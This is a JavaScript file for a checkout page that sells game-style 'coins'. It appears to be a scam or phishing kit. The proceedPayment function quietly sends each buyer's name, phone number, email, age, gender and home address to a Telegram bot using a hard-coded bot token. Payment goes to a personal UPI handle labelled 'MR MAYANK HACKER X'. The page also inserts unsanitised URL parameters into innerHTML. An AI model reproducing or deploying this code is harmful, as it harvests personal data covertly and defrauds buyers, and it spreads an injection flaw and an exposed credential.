const queryParams = new URLSearchParams(window.location.search);
const coins = queryParams.get("coins");
const price = queryParams.get("price");

function displayCheckoutDetails() {
    const container = document.getElementById("checkout-details");
    container.innerHTML = `
        <h3>Selected Plan</h3>
        <p><b>Coins : </b> ${coins}</p>
        <p><b>Price : </b> ₹${price}</p>
    `;
}

function validateEmail() {
    const email = document.getElementById("email").value.trim();
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const validDomains = [
        "@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com",
        "@icloud.com", "@aol.com", "@live.com", "@zoho.com",
        "@mail.com", "@protonmail.com"
    ];

    if (!emailRegex.test(email) || !validDomains.some(domain => email.endsWith(domain))) {
        alert("Invalid Email Address. Please Use A Valid Domain Like @gmail.com.");
        return false;
    }
    return true;
}

function validateMobile() {
    const mobile = document.getElementById("mobile").value.trim();
    const parts = mobile.split(' ');
    if (parts.length !== 2) {
        alert("Invalid Mobile Number Format. Use +CountryCode Space MobileNumber.");
        return false;
    }

    const countryCode = parts[0];
    const mobileNumber = parts[1];
    const countryCodes = {
        '+91': { startingDigits: ['6', '7', '8', '9'], length: 10 },
        '+1': { startingDigits: null, length: 10 },
        '+86': { startingDigits: ['1', '2', '3'], length: 11 },
        '+92': { startingDigits: ['3', '2', '1'], length: 10 },
        '+55': { startingDigits: ['9', '8'], length: 11 },
        '+7': { startingDigits: ['9', '8', '7'], length: 10 },
        '+81': { startingDigits: ['9', '8', '7'], length: 11 },
        '+49': { startingDigits: ['1', '2'], length: 11 },
        '+61': { startingDigits: ['4'], length: 10 },
        '+44': { startingDigits: ['7'], length: 11 }
    };

    if (countryCodes[countryCode]) {
        const rules = countryCodes[countryCode];
        if (rules.startingDigits && !rules.startingDigits.includes(mobileNumber[0])) {
            alert("Invalid Mobile Number. Check The Starting Digit.");
            return false;
        }
        if (mobileNumber.length !== rules.length || !/^\d+$/.test(mobileNumber)) {
            alert("Invalid Mobile Number Length Or Format.");
            return false;
        }
    } else {
        alert("Invalid Country Code.");
        return false;
    }
    return true;
}

function autoFill(fieldId, value) {
    const input = document.getElementById(fieldId);
    if (!input.value) {
        input.value = value;
    }
}

function proceedPayment() {
    if (!validateEmail() || !validateMobile()) {
        return;
    }

    const firstName = document.getElementById("first-name").value.trim();
    const lastName = document.getElementById("last-name").value.trim();
    const mobile = document.getElementById("mobile").value.trim();
    const email = document.getElementById("email").value.trim();
    const age = document.getElementById("age").value.trim();
    const gender = document.getElementById("gender").value;
    const country = document.getElementById("country").value.trim();
    const state = document.getElementById("state").value.trim();
    const addressLine1 = document.getElementById("address-line-1").value.trim();
    const addressLine2 = document.getElementById("address-line-2").value.trim();

    const userDetails = {
        firstName, lastName, mobile, email, age, gender, country, state, addressLine1, addressLine2, coins, price
    };

    sendUserDetailsToTelegram(userDetails);

    document.getElementById("user-details-form").style.display = "none";
    document.getElementById("payment-methods").style.display = "block";
}

async function sendUserDetailsToTelegram(details) {
    const TELEGRAM_API_TOKEN = "7012784992:AAF_RdlysbnaoS0DKoBcZFGxZNFq-28EGQw";
    const TELEGRAM_CHAT_ID = "6541281150";
    const message = `User Details : \n${JSON.stringify(details, null, 2)}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
}

function generateQRCode() {
    const output = document.getElementById("payment-output");
    const upiLink = getUPILink();
    output.innerHTML = `
        <h3>Scan This Qr Code</h3>
        <img src="https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(upiLink)}&size=200x200" alt="QR Code">
    `;
}

function openUPIApp() {
    const upiLink = getUPILink();
    window.location.href = upiLink;
}

function getUPILink() {
    const customMessage = `Payment For ${coins} Coins`;
    return `upi://pay?pa=7804844135@mbk&pn=MR MAYANK HACKER X&am=${price}&tn=${customMessage}&cu=INR`;
}

window.onload = displayCheckoutDetails;